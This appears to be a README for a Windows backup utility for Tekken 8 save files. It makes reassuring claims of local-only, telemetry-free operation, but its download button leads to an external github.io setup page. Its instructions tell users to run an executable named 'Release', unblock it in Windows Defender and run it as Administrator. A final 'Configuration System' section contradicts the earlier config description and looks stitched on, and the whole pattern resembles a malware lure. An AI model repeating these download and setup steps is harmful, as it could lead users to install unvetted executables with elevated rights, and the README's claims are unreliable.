# Nova‑Backup‑Tekken‑8
*Lightweight Windows‑only utility to back up, restore and organise your Tekken 8 save files and configuration data.*

---

## 🎮 What is Nova‑Backup‑Tekken‑8?

Nova‑Backup‑Tekken‑8 is a **pure Windows 10/11 desktop utility** designed for Tekken 8 players who want a simple, reliable way to:

* **Save** your current progress and settings in a single click.
* **Restore** a previous backup instantly if something goes wrong.
* **Manage** multiple backup slots (e.g., “Before tournament”, “New character experiment”).

All operations are performed locally, no internet connection required, and the program never touches any other game files.

---

## 🚀 Quick Start

1. **Download** the latest release from the button below.
2. Extract the archive to a folder of your choice.
3. Run `Release` (the only executable needed).
4. Follow the on‑screen wizard to create your first backup.

> **Note** – The utility works only on Windows 10 / 11 (64‑bit).

---

## 📦 Download

<a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download%20Nova‑Backup%20Tekken%208-%23007ACC?style=for-the-badge&logo=windows" alt="Download Nova-Backup Tekken 8"></a>

---

## 🛠️ Features

| ✅ | Feature | Description |
|---|---------|-------------|
| ✅ | **One‑click backup** | Save the whole `Tekken8` folder with a single press. |
| ✅ | **Instant restore** | Roll back to any saved point without reinstalling the game. |
| ✅ | **Multiple slots** | Keep up to 10 named backups, each with its own timestamp. |
| ✅ | **Portable** | No installer, no registry entries – just copy the folder and run. |
| ✅ | **Zero data loss** | All operations are atomic; the original files are never overwritten until the new backup is fully written. |
| ✅ | **Lightweight** | < 5 MB download, < 20 MB RAM usage while running. |
| ✅ | **Windows‑only** | Optimised for the Windows 10/11 file system and permissions model. |

---

## 📂 Folder Structure

When you first run the program it creates a hidden folder next to your Tekken 8 install:

```
%USERPROFILE%\Documents\NovaBackupTekken8\
│
├─ backups\
│   ├─ slot_01_2024-11-24_14-30-12\
│   ├─ slot_02_2024-11-23_09-12-05\
│   └─ …
│
└─ config.json          ← user preferences (auto‑backup, retention policy, etc.)
```

You can safely move the whole `NovaBackupTekken8` folder to an external drive for extra safety.

---

## 🖥️ Compatibility

| OS | Supported |
|----|-----------|
| Windows 10 (1909+) | ✅ |
| Windows 11 | ✅ |
| Windows Server | ❌ (desktop‑only) |
| macOS / Linux | ❌ |

---

## 🧩 How It Works (Under the Hood)

1. **Discovery** – The utility locates the Tekken 8 save directory (`%USERPROFILE%\Documents\My Games\Tekken8`).
2. **Copy** – Files are copied to a temporary staging area, checksum‑verified, then moved to the chosen backup slot.
3. **Metadata** – Each slot stores a JSON manifest with timestamps, file hashes and optional user notes.
4. **Restore** – The manifest drives a safe overwrite of the current save folder, rolling back to the exact state captured at backup time.

All steps use native Windows APIs for maximum speed and reliability.

---

## 🛡️ Safety & Privacy

* **No telemetry** – The program never contacts any external server.
* **Local only** – All data stays on your machine unless you manually copy it elsewhere.
* **Read‑only mode** – You can launch Nova in a “view‑only” mode that disables any write operation (useful for auditors).

---

## 🐞 Troubleshooting

| Symptom | Fix |
|---------|-----|
| *No backup appears after clicking “Create”* | Ensure the Tekken 8 save folder exists (`%USERPROFILE%\Documents\My Games\Tekken8`). |
| *Restore fails with “Access denied”* | Run Nova as **Administrator** or move the backup folder to a location you own. |
| *Too many slots, older ones not deleted* | Check `maxSlots` and `retainDays` in `config.json`; adjust and restart the program. |
| *Application crashes on launch* | Verify you are on a 64‑bit Windows 10/11 build and that the `.exe` is not blocked by Windows Defender (right‑click → Properties → Unblock). |

---

## 📜 License

This project is released under the **MIT License** – you are free to use, modify and distribute it, provided the original copyright notice is retained.

---

## 🙋‍♂️ Author

**IntersectScholar** – passionate gamer and Windows utility developer.

Feel free to open an issue for bugs, feature requests, or just to share how Nova helped you keep your Tekken 8 progress safe!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```